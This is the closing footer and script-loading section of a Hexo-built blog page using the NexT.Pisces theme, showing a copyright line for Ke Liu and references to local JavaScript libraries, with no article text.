        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">
  
  &copy;  2010 - 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Ke Liu</span>
</div>


<div class="powered-by">
  Powered by <a class="theme-link" href="https://hexo.io">Hexo</a>
</div>

<div class="theme-info">
  Theme -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Pisces
  </a>
</div>


        

        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.2"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.2"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>



  


  




	





  





  






  





  

  

  

  

  

  

</body>
</html>
